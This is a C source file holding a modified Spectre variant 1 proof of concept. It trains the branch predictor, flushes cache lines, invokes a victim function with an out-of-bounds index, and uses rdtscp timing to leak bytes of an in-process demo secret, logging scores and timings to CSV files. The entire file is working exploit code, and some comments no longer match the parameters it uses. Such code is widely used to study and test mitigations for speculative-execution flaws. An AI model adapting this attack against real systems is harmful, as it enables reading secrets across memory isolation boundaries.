#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <inttypes.h>

#ifdef _MSC_VER
#include <intrin.h> /* for rdtscp and clflush */

#pragma optimize("gt",on)

#else
#include <x86intrin.h> /* for rdtscp and clflush */

#endif

#define N_TRIES 200
#define N_VICTIM 159
#define N_TRAINING 16

/********************************************************************
Victim code.
********************************************************************/
unsigned int array1_size = 16;
uint8_t unused1[64];
uint8_t array1[160] = {
  1,
  2,
  3,
  4,
  5,
  6,
  7,
  8,
  9,
  10,
  11,
  12,
  13,
  14,
  15,
  16
};
uint8_t unused2[64];
uint8_t array2[256 * 512];
uint64_t reload_time[N_TRIES*256];

char * secret = "The Magic Words are Squeamish Ossifrage.";

uint8_t temp = 10; /* Used so compiler won’t optimize out victim_function() */

void victim_function(size_t x) {
//  printf("enter victim\n");
  if (x < array1_size) {
//    printf("before victim access\n");
    temp &= array2[array1[x] * 512];
//    printf("after victim access\n");
  }
}

/********************************************************************
Analysis code
********************************************************************/
#define CACHE_HIT_THRESHOLD 80 /* assume cache hit if time <= threshold */

static __inline__ uint64_t gy_rdtscp(void)
{
  uint32_t lo, hi;
  //__asm__ __volatile__ (
  //asm volatile (
  //      "xorl %%eax,%%eax \n        cpuid"
  //      ::: "%rax", "%rbx", "%rcx", "%rdx");
  //__asm__ __volatile__ ("rdtsc" : "=a" (lo), "=d" (hi));
  __asm__ __volatile__ ("rdtsc" : "=a" (lo), "=d" (hi));
  return (uint64_t)hi << 32 | lo;
}

/* Report best guess in value[0] and runner-up in value[1] */
void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2], int results[256]) {
  int tries, i, j, k, mix_i, junk = 0;
  size_t training_x, x;
  register uint64_t time1, time2;
  volatile uint8_t * addr;
  uint64_t reload_time_temp[256];

  for (i = 0; i < 256; i++)
    results[i] = 0;


  for (tries = N_TRIES; tries > 0; tries--) {

    /* Flush array2[256*(0..255)] from cache */
    for (i = 0; i < 256; i++)
      _mm_clflush( & array2[i * 512]); /* intrinsic for clflush instruction */

    /* 30 loops: 5 training runs (x=training_x)
                 per attack run (x=malicious_x)*/
    training_x = tries % array1_size;

    // Load the secret into cache for fast access
    //printf("%c", secret[0]);

    for (j = N_VICTIM; j >= 0; j--) {
      _mm_clflush( & array1_size);
      for (volatile int z = 0; z < 100; z++) {} /* Delay (can also mfence) */

      // Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0
      // Avoid jumps in case those tip off the branch predictor
      x = ((j % N_TRAINING) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
      x = (x | (x >> 16)); /* Set x=-1 if j&6=0, else x=0 */
      x = training_x ^ (x & (malicious_x ^ training_x));

      /* Call the victim! */
      victim_function(x);

    }

    /* Time reads. Order is lightly mixed up to prevent stride prediction */
    for (i = 0; i < 256; i++) {
      mix_i = ((i * 167) + 13) & 255;
      addr = & array2[mix_i * 512];
      time1 = __rdtscp( & junk); /* READ TIMER */
      junk = * addr; /* MEMORY ACCESS TO TIME */
      //junk = array2[mix_i * 512]; /* MEMORY ACCESS TO TIME */
      time2 = __rdtscp( & junk) - time1; // READ TIMER & COMPUTE ELAPSED TIME
      reload_time_temp[mix_i]=time2;
    }

    for (i = 0; i < 256; i++) {
      if (reload_time_temp[i] <= CACHE_HIT_THRESHOLD && i != array1[tries % array1_size])
        results[i]++; /* cache hit - add +1 to score for this value */
      reload_time[(N_TRIES-tries)*256+i]=reload_time_temp[i];
    }

    /* Locate highest & second-highest results results tallies in j/k */
    j = k = -1;
    for (i = 0; i < 256; i++) {
      if (j < 0 || results [i] >= results[j]) {
        k = j;
        j = i;
      } else if (k < 0 || results[i] >= results[k]) {
        k = i;
      }
    }
    value[0] = (uint8_t) j;
    score[0] = results[j];
    value[1] = (uint8_t) k;
    score[1] = results[k];
    //printf("%d %d %d %d %d\n", tries, value[0], score[0], value[1], score[1]);
    //if (results[j] >= (2 * results[k] + 5) ||
    //   (results[j] == 4 && results[k] == 0))
    //  break; /* Clear success if best is > 2*runner-up + 5 or 2/0) */
  }
  results[0] ^= junk;
  //temp ^= junk; /* use junk so code above won’t get optimized out*/
}

int main(int argc,
  const char * * argv) {
  /* default for malicious_x */
  size_t malicious_x = (size_t)(secret - (char * ) array1);
  int i, j, score[2], len = 10;
  uint8_t value[2];
  static int results[256];

  for (i = 0; i < sizeof(array2); i++)
    array2[i] = 1; /* write to array2 so in RAM not copy-on-write zero pages */
  //if (argc == 3) {
  //  sscanf(argv[1], "%p", (void * * )( & malicious_x));
  //  malicious_x -= (size_t) array1; /* Convert input value into a pointer */
  //  sscanf(argv[2], "%d", & len);
  //}

  FILE* resfile = fopen("spectre_result.csv", "w");
  FILE* timefile = fopen("spectre_time.csv", "w");

  //printf("Reading %d bytes:\n", len);
  while (--len >= 0) {
    //printf("Reading at malicious_x = %p... ", (void * ) malicious_x);
    readMemoryByte(malicious_x++, value, score, results);

    for (i = 0; i < 256; i++)
      fprintf(resfile, "%d ", results[i]);
    for (i = 0; i < N_TRIES; i++) {
      for (j = 0; j < 256; j++)
        fprintf(timefile, "%" PRIu64 " ", reload_time[i*256+j]);
      fprintf(timefile, "\n");
    }

    printf("%s: ", (score[0] > 2 * score[1] ? "Success" : "Unclear"));
    printf("0x%02X=’%c’ score=%d ", value[0],
      (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
    printf("(second best: 0x%02X score=%d)", value[1], score[1]);
    printf("\n");
  }

  printf("temp: %d\n", temp);

  fclose(resfile);
  fclose(timefile);

  return (0);
}
